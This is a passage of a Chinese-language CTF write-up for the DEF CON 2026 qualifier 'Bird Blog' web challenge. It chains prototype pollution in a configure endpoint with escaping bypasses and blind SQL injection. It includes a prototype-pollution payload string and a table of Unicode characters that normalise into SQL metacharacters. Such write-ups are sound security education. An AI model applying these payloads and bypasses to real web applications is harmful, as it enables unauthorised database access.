class="keyword">const</span> csrfToken = <span class="string">`<span class="subst">${csrfSalt}</span>;<span class="subst">${csrfHash}</span>`</span>;</span><br><span class="line">  request.<span class="property">csrfToken</span> = csrfToken;</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<p>來看看 admin 的 <code>/configure</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/admin.mjs:164</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">"/configure"</span>, <span class="title function_">async</span> (request, reply) =&gt; {</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">configure</span>(request.<span class="property">body</span>);</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">2</span>), <span class="number">500</span>);</span><br><span class="line">});</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>追進去 <code>configure</code>，看到 <code>navTree[superCategory][subCategory] = [];</code> 的地方可以做 prototype pollution，把值改成 <code>[]</code>；而 <code>[]</code> 轉換成 boolean 會是 true。但要注意，在 <code>app.post("/configure")</code> 的最後會把 app restart，讓 prototype pollution 被 reset。這時候可以透過觸發 <code>configure</code> 裡面的 <code>Error</code>，讓 control flow 不會走到那邊。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">configure</span>(<span class="params">rawArgs, adminOnly = <span class="literal">false</span></span>) {</span><br><span class="line">	<span class="keyword">let</span> categories = rawArgs?.<span class="property">categories</span>?.<span class="title function_">split</span>(<span class="string">","</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">category</span>) =&gt;</span> category.<span class="title function_">trim</span>()).<span class="title function_">filter</span>(<span class="function">(<span class="params">category</span>) =&gt;</span> category.<span class="property">length</span> &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// [...]</span></span><br><span class="line">		<span class="keyword">if</span> (dividerIndex !== -<span class="number">1</span>) {</span><br><span class="line">			<span class="keyword">const</span> superCategory = category.<span class="property">name</span>.<span class="title function_">slice</span>(<span class="number">0</span>, dividerIndex).<span class="title function_">trim</span>();</span><br><span class="line">			<span class="keyword">const</span> subCategory = category.<span class="property">name</span>.<span class="title function_">slice</span>(dividerIndex + <span class="number">1</span>).<span class="title function_">trim</span>();</span><br><span class="line">			</span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(navTree[superCategory])) {</span><br><span class="line">      	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Invalid category hierarchy: "<span class="subst">${superCategory}</span>" is both a category and a super-category`</span>);</span><br><span class="line">			}</span><br><span class="line">      </span><br><span class="line">			navTree[superCategory] ??= {};</span><br><span class="line">			navTree[superCategory][subCategory] = [];</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="comment">// [...]</span></span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> file <span class="keyword">of</span> <span class="keyword">await</span> fs.<span class="title function_">readdir</span>(configTemplateDir, { <span class="attr">recursive</span>: <span class="literal">true</span>, <span class="attr">withFileTypes</span>: <span class="literal">true</span> })) {</span><br><span class="line">		<span class="keyword">if</span> (file.<span class="title function_">isDirectory</span>()) {</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(file.<span class="property">parentPath</span>, file.<span class="property">name</span>);</span><br><span class="line">		<span class="keyword">const</span> relativePath = path.<span class="title function_">relative</span>(configTemplateDir.<span class="property">pathname</span>, filePath);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (adminOnly &amp;&amp; !relativePath.<span class="title function_">includes</span>(<span class="string">"/admin/"</span>) &amp;&amp; !relativePath.<span class="title function_">includes</span>(<span class="string">"/partials/"</span>)) {</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">await</span> fs.<span class="title function_">mkdir</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(path.<span class="title function_">dirname</span>(relativePath), templateDir), { <span class="attr">recursive</span>: <span class="literal">true</span> });</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (relativePath.<span class="title function_">endsWith</span>(<span class="string">".chbs"</span>)) {</span><br><span class="line">			<span class="keyword">const</span> templateContent = <span class="keyword">await</span> fs.<span class="title function_">readFile</span>(filePath, <span class="string">"utf-8"</span>);</span><br><span class="line">			<span class="keyword">const</span> template = handlebars.<span class="title function_">compile</span>(templateContent);</span><br><span class="line">			<span class="keyword">const</span> rendered = <span class="title function_">template</span>(args);</span><br><span class="line">			<span class="keyword">const</span> outputPath = <span class="keyword">new</span> <span class="title function_">URL</span>(relativePath.<span class="title function_">replace</span>(<span class="string">".chbs"</span>, <span class="string">""</span>), templateDir);</span><br><span class="line">			<span class="keyword">await</span> fs.<span class="title function_">writeFile</span>(outputPath, rendered, <span class="string">"utf-8"</span>);</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="keyword">const</span> outputPath = <span class="keyword">new</span> <span class="title function_">URL</span>(relativePath, templateDir);</span><br><span class="line">			<span class="keyword">await</span> fs.<span class="title function_">copyFile</span>(filePath, outputPath);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>在 <code>configure</code> 的最後面，會根據我們提供的資料套入 template，我們可以藉此寫入 <code>.sql</code> 檔。能用的有 <code>bird-blog/app/config-template/sql/blog/archive.sql.chbs</code>, <code>bird-blog/app/config-template/sql/blog/categories.sql.chbs</code></p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tree -P '*.chbs' config-template</span></span><br><span class="line">config-template</span><br><span class="line">├── hbs</span><br><span class="line">│   ├── admin</span><br><span class="line">│   │   ├── configure.hbs.chbs</span><br><span class="line">│   │   └── layout.hbs.chbs</span><br><span class="line">│   ├── blog</span><br><span class="line">│   │   └── layout.hbs.chbs</span><br><span class="line">│   └── partials</span><br><span class="line">└── sql</span><br><span class="line">    ├── admin</span><br><span class="line">    └── blog</span><br><span class="line">        ├── archive.sql.chbs</span><br><span class="line">        └── categories.sql.chbs</span><br><span class="line"></span><br><span class="line">8 directories, 5 files</span><br></pre></td></tr></table></figure></div>
+
+<p><code>categories.sql</code> 會在每次 <code>db.mjs</code> 被 import 的時候被執行。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/db.mjs:27</span></span><br><span class="line"><span class="comment">// Always reload categories, in case the configuration changed</span></span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">	<span class="keyword">const</span> categoriesSql = <span class="keyword">new</span> pgp.<span class="title class_">QueryFile</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">"blog/categories.sql"</span>, sqlDir));</span><br><span class="line">	<span class="keyword">await</span> db.<span class="title function_">any</span>(categoriesSql);</span><br><span class="line">} <span class="keyword">catch</span> (err) {</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"Error reloading categories:"</span>, err);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p><code>archive.sql</code> 則是在 <code>executeQuery</code> 的時候被執行。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/db.mjs:37</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">executeQuery</span>(<span class="params">name, parameters = []</span>) {</span><br><span class="line">	<span class="keyword">let</span> queryFile;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (queryCache.<span class="title function_">has</span>(name)) {</span><br><span class="line">		queryFile = queryCache.<span class="title function_">get</span>(name);</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		queryFile = <span class="keyword">new</span> pgp.<span class="title class_">QueryFile</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">`<span class="subst">${name}</span>.sql`</span>, sqlDir));</span><br><span class="line">		queryCache.<span class="title function_">set</span>(name, queryFile);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> result = <span class="keyword">await</span> db.<span class="title function_">any</span>(queryFile, parameters);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p><code>archive.sql.chbs</code> 裏面會把我們可控的東西，經過 <code>slugify</code>  <code>sqlString</code> 後放進去。</p>
+<div class="code-container" data-rel="Handlebars"><figure class="iseeu highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">// bird-blog/app/config-template/sql/blog/archive.sql.chbs:51</span></span><br><span class="line"><span class="language-xml">// [...]</span></span><br><span class="line"><span class="language-xml">		WITH top_categories AS (</span></span><br><span class="line"><span class="language-xml">			VALUES</span></span><br><span class="line"><span class="language-xml">			</span><span class="template-tag">{{#<span class="name"><span class="built_in">each</span></span> topCategories}}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">				(</span><span class="template-variable">{{ @<span class="name">index</span> }}</span><span class="language-xml">, </span><span class="template-variable">{{{ <span class="name">sqlString</span> (<span class="name">slugify</span> name) }}}</span><span class="language-xml">)</span><span class="template-tag">{{#<span class="name"><span class="built_in">unless</span></span> @last}}</span><span class="language-xml">,</span><span class="template-tag">{{/<span class="name"><span class="built_in">unless</span></span>}}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">			</span><span class="template-tag">{{/<span class="name"><span class="built_in">each</span></span>}}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">		)</span></span><br><span class="line"><span class="language-xml">// [...]</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="繞-sqlString"><a href="#繞-sqlString" class="headerlink" title="繞 sqlString"></a>繞 <code>sqlString</code></h4><p><code>sqlString</code> 裏面會把字串中的 <code>'</code> 取代成 escape 後的 <code>''</code>。但沒有處理 <code>\</code> 的 case，可以拿來繞。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/hbs.mjs:9</span></span><br><span class="line">handlebars.<span class="title function_">registerHelper</span>(<span class="string">"sqlString"</span>, <span class="keyword">function</span> (<span class="params">str</span>) {</span><br><span class="line">	<span class="keyword">return</span> <span class="string">`'<span class="subst">${str}</span>'`</span>.<span class="title function_">replace</span>(<span class="regexp">/'/g</span>, <span class="string">"''"</span>).<span class="title function_">slice</span>(<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<p> 不過正常情況下，PostgresSQL 不會把 <code>\</code> 當成 escape <code>'</code> 的東西，除非是在 <code>E''</code> 裡面。這個 app query db 的時候，使用的是<a target="_blank" rel="noopener" href="https://vitaly-t.github.io/pg-promise/QueryFile.html"> <code>pgp.QueryFile</code></a>，他有個 <code>minify</code> 的選項可以開。開了之後會使用 <code>pg-minify</code>。<code>pg-minify</code> 會把 <code>\</code> 當成 escape 的意思，所以只要把 <code>minify</code> 的選項打開就能過。直接用前面的 prototype pollution 就能把選項變 true。另外 <a target="_blank" rel="noopener" href="https://vitaly-t.github.io/pg-promise/QueryFile.html"> <code>pgp.QueryFile</code></a> 還有一個 <code>debug</code> 選項，打開後如果 sql 檔有改動就會重讀，否則可能都會一直讀到舊的。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*__proto__/minify,*__proto__/debug,*__proto__</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="繞-slugify"><a href="#繞-slugify" class="headerlink" title="繞 slugify"></a>繞 <code>slugify</code></h4><p><code>slugify</code> 會把 <code>/[^\w\s]/</code> 的字都移除。所以不能直接用 <code>\</code>。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/hbs.mjs:13</span></span><br><span class="line">handlebars.<span class="title function_">registerHelper</span>(<span class="string">"slugify"</span>, <span class="keyword">function</span> (<span class="params">str</span>) {</span><br><span class="line">	<span class="keyword">const</span> slug = <span class="title function_">slugify</span>(str.<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">" "</span>), { <span class="attr">lower</span>: <span class="literal">true</span>, <span class="attr">remove</span>: <span class="regexp">/[^\w\s]/</span> });</span><br><span class="line">	<span class="keyword">if</span> (slug.<span class="title function_">includes</span>(<span class="string">"/"</span>)) {</span><br><span class="line">		<span class="comment">// Needs to be a valid URL segment</span></span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Invalid slug "<span class="subst">${slug}</span>" generated from "<span class="subst">${str}</span>"`</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> slug;</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/slugify.mjs</span></span><br><span class="line"><span class="keyword">import</span> anyascii <span class="keyword">from</span> <span class="string">"any-ascii"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">slugify</span>(<span class="params">text, options = {}</span>) {</span><br><span class="line">	<span class="keyword">let</span> slug = text.<span class="title function_">split</span>(<span class="string">""</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> {</span><br><span class="line">		cur = <span class="title function_">anyascii</span>(cur);</span><br><span class="line">		<span class="keyword">return</span> acc + cur.<span class="title function_">replace</span>(options.<span class="property">remove</span> ?? <span class="regexp">/[^\w\s$*_+~.()'"!\-:@]+/g</span>, <span class="string">""</span>);</span><br><span class="line">	}, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (options.<span class="property">trim</span> ?? <span class="literal">true</span>) {</span><br><span class="line">		slug = slug.<span class="title function_">trim</span>();</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	slug = slug.<span class="title function_">replace</span>(<span class="regexp">/-+/g</span>, <span class="string">"-"</span>);</span><br><span class="line">	slug = slug.<span class="title function_">replace</span>(<span class="regexp">/^-+|-+$/g</span>, <span class="string">""</span>);</span><br><span class="line">	slug = slug.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">"-"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (options.<span class="property">lower</span> ?? <span class="literal">false</span>) {</span><br><span class="line">		slug = slug.<span class="title function_">toLowerCase</span>();</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slug;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>但注意到他 <code>cur.replace</code> 裏面沒有開 global (<code>/[^\w\s]/g</code>)，只會濾掉第一次出現的。且 <code>anyascii</code> 對於某些 unicode，可能把一個字變多個字。所以像是 <code>⳹</code> 這種字，就會經過 <code>⳹ -&gt; \\ -&gt; \</code>，就可以拿到 <code>\</code> 了。</p>
+<div class="code-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">⳹ -&gt; \</span><br><span class="line">⸩ -&gt; )</span><br><span class="line">⸨ -&gt; (</span><br><span class="line">ᕯ -&gt; *</span><br><span class="line">‖ -&gt; |</span><br><span class="line">࠲ -&gt; .</span><br><span class="line">≅ -&gt; =</span><br><span class="line">∷ -&gt; :</span><br><span class="line">« -&gt; &lt;</span><br><span class="line">» -&gt; &gt;</span><br><span class="line">⸺ -&gt; -</span><br></pre></td></tr></table></figure></div>
+
+<p>所以能正常 SQL Injection 了。可以透過 server 回傳 200, 500 的差別，來 leak 資料。所以解了。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbb{we_will_return_to_our_ctf_in_a_minute_but_first_a_word_from_our_sponsors_at_squawkspace:…}</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> DEF CON CTF Qualifier Write-up</li>
+        <li><strong>Author:</strong> Ching367436</li>
+        <li><strong>Created at
+                :</strong> 2026-05-30 15:12:44</li>
+        
+        <li>
+            <strong>Link:</strong> https://blog.ching367436.me/def-con-ctf-2026-qual/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/defcon/">#defcon</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-pre-exam-2023-write-up/" title="AIS3 Pre-exam 2023 Write-up" rel="bookmark">
+  <img src="/ais3-pre-exam-2023-write-up/myfirstctf-staff.webp" alt="AIS3 Pre-exam 2023 Write-up" class="!max-w-none">
+  <span class="title">AIS3 Pre-exam 2023 Write-up</span>
+</a><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
+  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/hitcon-ctf-2025/" title="HITCON CTF 2025" rel="bookmark">
+  <img src="/hitcon-ctf-2025/tree.webp" alt="HITCON CTF 2025" class="!max-w-none">
+  <span class="title">HITCON CTF 2025</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-pre-exam-2023-write-up/" title="AIS3 Pre-exam 2023 Write-up" rel="bookmark">
+  <img src="/ais3-pre-exam-2023-write-up/myfirstctf-staff.webp" alt="AIS3 Pre-exam 2023 Write-up" class="!max-w-none">
+  <span class="title">AIS3 Pre-exam 2023 Write-up</span>
+</a><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
+  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Write-up</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/hitcon-ctf-2025/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HITCON CTF 2025</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        (function() {
+            const containerId = "giscus-container";
+            const mapping = "title";
+            const lang = "en";
+            const inputPosition = "bottom";
+            const reactionsEnabled = "1" === "1";
+            const emitMetadata = "1" === "1";
+            const strict = "0" === "1";
+            const loading = "lazy";
+
+            const getTerm = () => {
+                if (mapping === "pathname") return location.pathname;
+                if (mapping === "url") return location.href;
+                if (mapping === "title") return document.title;
+                if (mapping === "og:title") {
+                    const ogTitle = document.querySelector("meta[property='og:title']");
+                    return ogTitle?.content || document.title;
+                }
+                return "";
+            };
+
+            const sendUpdate = () => {
+                const iframe = document.querySelector("iframe.giscus-frame");
+                if (!iframe) {
+                    return;
+                }
+
+                const setConfig = {
+                    theme: "preferred_color_scheme",
+                    lang,
+                    inputPosition,
+                    reactionsEnabled,
+                    emitMetadata,
+                    strict,
+                };
+
+                if (mapping !== "number") {
+                    const term = getTerm();
+                    if (term) {
+                        setConfig.term = term;
+                    }
+                }
+
+                iframe.contentWindow.postMessage(
+                    { giscus: { setConfig } },
+                    "https://giscus.app",
+                );
+            };
+
+            const loadGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                const iframe = container.querySelector("iframe.giscus-frame");
+                if (iframe) {
+                    sendUpdate();
+                    return;
+                }
+
+                if (container.dataset.giscusInit === "true") {
+                    return;
+                }
+
+                const giscusConfig = {
+                    src: "https://giscus.app/client.js",
+                    "data-repo": "Ching367436/blog",
+                    "data-repo-id": "R_kgDOJNMXOw",
+                    "data-category": "Giscus",
+                    "data-category-id": "DIC_kwDOJNMXO84CVeVB",
+                    "data-mapping": mapping,
+                    "data-strict": "0",
+                    "data-reactions-enabled": "1",
+                    "data-emit-metadata": "1",
+                    "data-theme": "preferred_color_scheme",
+                    "data-lang": lang,
+                    "data-input-position": inputPosition,
+                    "data-loading": loading,
+                    crossorigin: "anonymous",
+                    async: true,
+                };
+
+                const giscusScript = document.createElement("script");
+                for (const key in giscusConfig) {
+                    giscusScript.setAttribute(key, giscusConfig[key]);
+                }
+                container.appendChild(giscusScript);
+                container.dataset.giscusInit = "true";
+            };
+
+            const runGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                if (container.querySelector("iframe.giscus-frame")) {
+                    sendUpdate();
+                    return;
+                }
+
+                loadGiscus();
+            };
+
+            runGiscus();
+        })();
+    </script>
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">DEF CON CTF Qualifier Write-up</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Network-Waybird-Machine"><span class="nav-text">[Web&#x2F;Network] Waybird Machine</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%AB%E6%AA%94"><span class="nav-text">寫檔</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-FTP-to-SSRF-Babelfish"><span class="nav-text">SSRF FTP to SSRF Babelfish</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Bird-Blog"><span class="nav-text">[Web] Bird Blog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#postgres"><span class="nav-text">postgres</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bot"><span class="nav-text">bot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#blog-app"><span class="nav-text">blog_app</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Admin-Service"><span class="nav-text">Admin Service</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B9%9E-sqlString"><span class="nav-text">繞 sqlString</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B9%9E-slugify"><span class="nav-text">繞 slugify</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        15 posts in total
+                    </span>
+                    
+                        <span>
+                            40.5k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
